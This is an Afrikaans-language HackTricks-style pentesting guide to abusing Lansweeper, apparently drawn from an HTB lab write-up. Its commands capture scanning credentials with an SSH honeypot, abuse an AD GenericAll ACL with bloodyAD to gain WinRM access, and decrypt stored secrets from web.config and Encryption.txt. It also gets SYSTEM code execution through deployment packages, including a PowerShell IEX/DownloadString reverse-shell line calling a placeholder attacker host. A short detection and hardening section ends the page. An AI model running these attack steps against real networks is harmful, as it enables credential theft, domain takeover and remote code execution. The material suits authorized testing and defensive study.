# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper is ’n IT asset discovery- en inventoryplatform wat algemeen op Windows ontplooi word en met Active Directory geïntegreer is. Credentials wat in Lansweeper gekonfigureer is, word deur sy scanning engines gebruik om oor protokolle soos SSH, SMB/WMI en WinRM aan assets te authenticate. Misconfigurations laat dikwels die volgende toe:

- Credential interception deur ’n scanning target na ’n attacker-controlled host (honeypot) te herlei
- Abuse van AD ACLs wat deur Lansweeper-related groups blootgestel word om remote access te verkry
- On-host decryption van Lansweeper-configured secrets (connection strings en stored scanning credentials)
- Code execution op managed endpoints via die Deployment feature (wat dikwels as SYSTEM loop)

Hierdie bladsy som praktiese attacker-workflows en commands op om hierdie gedrag tydens engagements te abuse.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: skep ’n Scanning Target wat na jou host wys en map bestaande Scanning Credentials daaraan. Wanneer die scan loop, sal Lansweeper probeer om met daardie credentials te authenticate, en jou honeypot sal dit capture.<sup>[[1]](#references)</sup>

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (of Single IP) = jou VPN IP
- Configureer SSH port na iets wat reachable is (bv. 2022 indien 22 geblokkeer is)
- Disable schedule en beplan om dit manually te trigger
- Scanning → Scanning Credentials → verseker dat Linux/SSH creds bestaan; map hulle na die nuwe target (enable alles soos nodig)
- Klik “Scan now” op die target
- Run ’n SSH honeypot en retrieve die attempted username/password

Example with sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valideer vasgelegde creds teen DC-dienste:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Ander protocols is nie ekwivalent nie: ’n SMB/WinRM-listener verkry normaalweg ’n NTLM challenge-response eerder as ’n cleartext-wagwoord. Om dit te crack of relay hang af van die onderhandelde protocol-beskerming; sien [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH-wagwoord-authentication is gewoonlik die eenvoudigste cleartext-geval.
- SSH public-key authentication stel die gebruikersnaam en public-key fingerprint aan die server bloot, **nie** die private key of sy passphrase nie. Herwin key-backed credentials vanaf die gekompromitteerde Lansweeper-server eerder as om te verwag dat ’n honeypot dit sal openbaar.<sup>[[2]](#references)</sup>
- Baie scanners identifiseer hulself met duidelike client banners (bv. RebexSSH) en sal benign commands probeer (uname, whoami, ens.).

### Die credential-keusevolgorde is belangrik

Vir ’n rescan probeer Lansweeper eers weer die credential wat laaste vir daardie asset suksesvol was, daarna die eksplisiet gemapte credentials in hul gekonfigureerde volgorde, en laastens die globale credential van dieselfde tipe. ’n Honeypot wat die eerste password authentication aanvaar, sal dus normaalweg nie latere fallback-credentials waarneem nie; tydens ’n gemagtigde credential-path-assessment, log en reject pogings indien die doel is om die volledige fallback sequence te verifieer.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: verkry remote access deur jouself by ’n app-admin-groep te voeg

Gebruik BloodHound om effektiewe regte vanaf die gekompromitteerde account te enumerate. ’n Algemene finding is ’n scanner- of app-spesifieke groep (bv. “Lansweeper Discovery”) wat GenericAll oor ’n bevoorregte groep (bv. “Lansweeper Admins”) het. Indien die bevoorregte groep ook ’n lid van “Remote Management Users” is, word WinRM beskikbaar sodra ons onsself byvoeg.<sup>[[1]](#references)[[5]](#references)</sup>

Collection-voorbeelde:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Eksploiteer GenericAll op ’n groep met BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kry dan ’n interaktiewe shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wenk: Kerberos-bewerkings is tydsensitief. Indien jy KRB_AP_ERR_SKEW teëkom, sinkroniseer eers met die DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-gekonfigureerde secrets op die host

Op die Lansweeper-bediener stoor die ASP.NET-werf tipies ’n geënkripteerde connection string en ’n simmetriese sleutel wat deur die toepassing gebruik word. Met toepaslike plaaslike toegang kan jy die DB-connection string dekripteer en dan gestoorde scanning credentials onttrek.<sup>[[1]](#references)</sup>

Tipiese liggings:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Gebruik SharpLansweeperDecrypt om dekripsie en die dump van gestoorde creds te outomatiseer. Sonder argumente dekripteer die huidige executable `web.config`, koppel aan die databasis en dump alle gekonfigureerde scanning credentials; `-e` ondersteun ook offline/manual dekripsie wanneer ’n geënkripteerde waarde en die key file reeds beskikbaar is:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Verwagte uitvoer sluit DB-verbindingsbesonderhede en plaintext-skanderingsbewyse in, soos Windows- en Linux-rekeninge wat regoor die omgewing gebruik word. Hierdie het dikwels verhoogde plaaslike regte op domeingashere:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Gebruik herwonne Windows-skandering-creds vir bevoorregte toegang:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper-ontplooiing → SYSTEM RCE

As 'n lid van “Lansweeper Admins” stel die web-UI Deployment en Configuration bloot. Onder Deployment → Deployment packages kan jy pakkette skep wat arbitrêre opdragte op geteikende bates uitvoer. Lansweeper gebruik 'n administratiewe skanderingsbewys om toegang tot die teiken se Task Scheduler en `C$` te verkry, en skep dan 'n taak vir die ontplooiing. Wanneer die pakket die **System Account**-loopmodus gebruik, word die payload as `NT AUTHORITY\SYSTEM` uitgevoer; ander loopmodusse kan die gekarteerde skanderingsbewys of die tans aangemelde gebruiker gebruik, dus moet jy die geselekteerde modus verifieer eerder as om SYSTEM te aanvaar.<sup>[[1]](#references)[[7]](#references)</sup>

Hoëvlakstappe:
- Skep 'n nuwe Deployment package wat 'n PowerShell- of cmd-eenlynopdrag uitvoer (reverse shell, add-user, ens.).
- Teiken die gewenste bate (bv. die DC/gasheer waarop Lansweeper loop) en klik Deploy/Run now.
- Vang jou shell as SYSTEM op.

Voorbeeld-payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Gebruik dit oordeelkundig.

### Deployment-artefakte en ’n tweede punt vir credential-blootstelling

Die scanner skryf sy deployment-uitvoerbare lêer via `C$` na `C:\Windows\LSDeployment`. Package-lêers word normaalweg vanaf `DefaultPackageShare$` gelees, wat deur `C:\Program Files (x86)\Lansweeper\PackageShare` ondersteun word, of vanaf ’n IP-reeks-spesifieke package share. Belangrik is dat Lansweeper dokumenteer dat die package-share credential in **omkeerbaar geënkripteerde vorm in die register van elke rekenaar wat ’n deployment ontvang, gestoor word**. Behandel ’n gekompromitteerde bestuurde endpoint as ’n potensiële disclosure-punt vir daardie share-rekening, en inspekteer die deployment-gids, scheduled-task-geskiedenis en gekonfigureerde package shares wanneer Lansweeper-aktiwiteit gerekonstrueer word.<sup>[[7]](#references)</sup>

## Opsporing en verharding

- Beperk of verwyder anonieme SMB-enumerasies. Monitor vir RID cycling en abnormale toegang tot Lansweeper shares.
- Egress-kontroles: blokkeer of beperk uitgaande SSH/SMB/WinRM streng vanaf scanner-hosts. Stel waarskuwings op vir nie-standaardpoorte (bv. 2022) en ongewone kliëntbaniere soos Rebex.
- Beskerm `Website\\web.config` en `Key\\Encryption.txt`. Plaas secrets ekstern in ’n vault en roteer dit wanneer dit blootgestel word. Oorweeg service accounts met minimale privileges en gMSA waar dit haalbaar is.
- AD-monitering: stel waarskuwings op vir veranderinge aan Lansweeper-verwante groepe (bv. “Lansweeper Admins”, “Remote Management Users”) en vir ACL-veranderinge wat GenericAll/Write-lidmaatskap op privileged groups toestaan.
- Oudit die skepping/verandering/uitvoering van Deployment packages en korreleer nuwe remote scheduled tasks met skrywings na `C:\Windows\LSDeployment`; stel waarskuwings op vir packages wat `cmd.exe`/`powershell.exe` begin of onverwagte uitgaande verbindings maak.
- Gee package-share credentials slegs **Read & Execute**-toestemming en moet dit nooit vir administrasie hergebruik nie. Verkies agent-based inventory waar prakties: indien alle rekenaars deur ’n agent geskandeer word en die deployment module ongebruik is, vereis Lansweeper nie gestoor rekenaarscan-credentials nie.<sup>[[6]](#references)[[7]](#references)</sup>

## Verwante onderwerpe
- [SMB/LSA/SAMR-enumerasie en RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos-authentication en oorwegings rondom clock skew](kerberos-authentication.md)
- [BloodHound-padanalise](bloodhound.md)
- [WinRM-gebruik en laterale beweging](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Misbruik van Lansweeper-scanning, AD ACLs en secrets om ’n DC oor te neem (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH-honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Skep en karteer scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment-vereistes — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
